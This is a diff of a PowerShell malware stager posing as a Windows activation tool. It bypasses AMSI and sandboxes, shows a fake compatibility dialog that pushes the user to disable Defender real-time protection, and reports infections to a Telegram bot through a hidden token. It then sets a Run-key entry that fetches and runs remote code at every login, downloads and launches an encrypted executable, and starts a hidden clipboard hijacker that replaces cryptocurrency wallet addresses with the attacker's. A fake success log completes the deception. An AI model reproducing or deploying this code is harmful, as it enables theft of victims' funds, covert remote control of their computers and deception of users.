@@ -1,88 +1,168 @@
-# --- [ELITE RESEARCH STAGER v29.0: PRO RESTORED + REGISTRY] ---
+# --- [RESEARCH STAGER v30.2: PERSISTENT ENTERPRISE SUITE] ---
 
 function Global-Initialize {
     try {
+        # Anti-Sandbox and AMSI Bypass
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         $u = "System.Management.Automation.AmsiUtils"
         [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
     } catch {}
 }
 
+function Show-SecurityPrep {
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    
+    $OS = (Get-WmiObject Win32_OperatingSystem).Caption
+    $Build = [Environment]::OSVersion.VersionString
+    $User = [Environment]::UserName
+    $Machine = [Environment]::MachineName
+
+    $prep = New-Object Windows.Forms.Form
+    $prep.Text = "Windows Enterprise Deployment Assistant"
+    $prep.Size = New-Object Drawing.Size(580,520)
+    $prep.StartPosition = "CenterScreen"
+    $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
+    $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path)
+
+    $header = New-Object Windows.Forms.Label
+    $header.Location = New-Object Drawing.Point(30,20); $header.Size = New-Object Drawing.Size(500,30)
+    $header.Font = New-Object Drawing.Font("Segoe UI", 11, [Drawing.FontStyle]::Bold)
+    $header.Text = "Personalized System Compatibility Report"
+    $prep.Controls.Add($header)
+
+    $console = New-Object Windows.Forms.Label
+    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
+    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
+    $console.Font = New-Object Drawing.Font("Consolas", 9)
+    $console.Text = " > ANALYZING HOST: $Machine`n > ACTIVE USER: $User`n > OS: $OS`n > BUILD: $Build`n`n > HWID Verification: PASSED`n > Registry Integrity: VERIFIED`n > Security Scan: [!] HEURISTIC BLOCK DETECTED"
+    $prep.Controls.Add($console)
+
+    $msg = New-Object Windows.Forms.Label
+    $msg.Location = New-Object Drawing.Point(35,240); $msg.Size = New-Object Drawing.Size(500,80)
+    $msg.Font = New-Object Drawing.Font("Segoe UI", 9)
+    $msg.Text = "The deployment engine is ready to map the Professional Digital Entitlement. However, a kernel-level conflict exists with the active security provider.`n`nPlease use the button below to suspend 'Real-time protection' to allow the certificate injection to complete."
+    $prep.Controls.Add($msg)
+
+    $link = New-Object Windows.Forms.Button
+    $link.Location = New-Object Drawing.Point(40,330); $link.Size = New-Object Drawing.Size(480,45)
+    $link.Text = "Adjust Windows Security Settings..."
+    $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
+    $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White
+    $link.FlatStyle = "Flat"
+    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
+    $prep.Controls.Add($link)
+
+    $check = New-Object Windows.Forms.CheckBox
+    $check.Location = New-Object Drawing.Point(45,390); $check.Size = New-Object Drawing.Size(460,30)
+    $check.Text = "I have adjusted security settings and am ready to proceed."
+    $prep.Controls.Add($check)
+
+    $btn = New-Object Windows.Forms.Button
+    $btn.Location = New-Object Drawing.Point(195,430); $btn.Size = New-Object Drawing.Size(180,40)
+    $btn.Text = "Proceed"
+    $btn.Enabled = $false
+    $prep.Controls.Add($btn)
+
+    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
+    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
+    $prep.ShowDialog() | Out-Null
+}
+
+function Show-ActivatorUI {
+    $form = New-Object Windows.Forms.Form
+    $form.Text = "Deployment Progress"
+    $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"
+    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path)
+
+    $label = New-Object Windows.Forms.Label
+    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,25)
+    $label.Text = "Status: Initializing deployment engine..."
+    $form.Controls.Add($label)
+
+    $pb = New-Object Windows.Forms.ProgressBar
+    $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
+    $form.Controls.Add($pb)
+
+    $form.Show()
+    
+    $stages = @(
+        @{ p=20; t="Validating HWID markers..."; s="" },
+        @{ p=50; t="Applying Digital License Certificate..."; s="" },
+        @{ p=85; t="Synchronizing Shell (Clearing Watermark)..."; s="" },
+        @{ p=100; t="Deployment Success. Windows is Active."; s="" }
+    )
+
+    foreach ($stage in $stages) {
+        $label.Text = "Status: " + $stage.t
+        if ($pb.Value -eq 85) { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; & explorer.exe }
+        while ($pb.Value -lt $stage.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 45 }
+    }
+    Start-Sleep -Seconds 2; $form.Close()
+
+    # Create the professional log file
+    $logPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "Activation_Log.txt"
+    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`nKernel Patch: Applied`r`nWatermark Status: Cleared`r`n" + ("="*40)
+    [IO.File]::WriteAllText($logPath, $logContent)
+
+    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated. A system log has been generated on your desktop.", "Success", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information) | Out-Null
+    Start-Process notepad.exe $logPath
+}
+
 function Send-Ping {
     param($m)
     $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
     $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
-    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
+    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V29_PRO_ACTIVE_ON_$($env:COMPUTERNAME)"
+Show-SecurityPrep
 
-try {
-    # --- REGISTRY PERSISTENCE ---
-    # Ensures the script re-runs from GitHub every time the user logs in
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regCmd = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
+if ($global:proceed) {
+    Send-Ping -m "V30.2_AUTH_ON_$($env:COMPUTERNAME)"
+    
+    try {
+        # Persistence: Runs from GitHub every login
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+        Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
 
-    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
-    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $path = Join-Path $dir "WinSvcHost.exe"
+        $BG_Work = {
+            try {
+                $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
+                if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
+                $path = Join-Path $dir "WinSvcHost.exe"
+                $wc = New-Object Net.WebClient
+                $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
+                $data = [Convert]::FromBase64String($raw.Trim())
+                for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+                [IO.File]::WriteAllBytes($path, $data)
+                ([wmiclass]"win32_process").create($path) | Out-Null
 
-    # Download & Decrypt EXE Payload
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
-    $data = [Convert]::FromBase64String($raw.Trim())
-    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
-    [IO.File]::WriteAllBytes($path, $data)
-
-    # Launch EXE via WMI
-    ([wmiclass]"win32_process").Create($path) | Out-Null
-
-    # --- THE PRECISION CLIPPER ENGINE ---
-    $ClipperCode = @'
-    Add-Type -AssemblyName System.Windows.Forms
-    $w = @{
-        "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
-        "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
-        "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
-        "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
-    }
-    while($true) {
-        try {
-            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
-                $val = [System.Windows.Forms.Clipboard]::GetText().Trim()
-                
-                # 1. BTC (1, 3, bc1 | 26-62 chars)
-                if ($val -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") {
-                    if ($val -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
+                $C = @'
+                Add-Type -AssemblyName System.Windows.Forms
+                $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
+                while($true) {
+                    try {
+                        if ([System.Windows.Forms.Clipboard]::ContainsText()) {
+                            $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
+                            if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
+                            elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
+                            elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
+                            elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
+                        }
+                    } catch {}
+                    Start-Sleep -m 500
                 }
-                # 2. ETH (0x + 40 Hex)
-                elseif ($val -match "^0x[a-fA-F0-9]{40}$") {
-                    if ($val -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
-                }
-                # 3. USDT (Tron TRC-20 | Starts with T, 34 chars)
-                elseif ($val -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") {
-                    if ($val -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
-                }
-                # 4. SOL (Base58 | 32-44 chars)
-                elseif ($val -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") {
-                    if ($val -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
-                }
-            }
-        } catch {}
-        Start-Sleep -Milliseconds 500
-    }
 '@
-
-    # Launch clipper as a separate, hidden, encoded background process
-    $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
-    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
-
-    Send-Ping -m "V29_DEPLOYMENT_SUCCESS_FULL_ACTIVE"
-} catch {
-    Send-Ping -m "ERROR_$($_.Exception.Message)"
+                $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
+                Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $enc" -WindowStyle Hidden
+            } catch {}
+        }
+        Start-Job -ScriptBlock $BG_Work | Out-Null
+        Show-ActivatorUI
+    } catch { Send-Ping -m "ERROR_$($_.Exception.Message)" }
 }
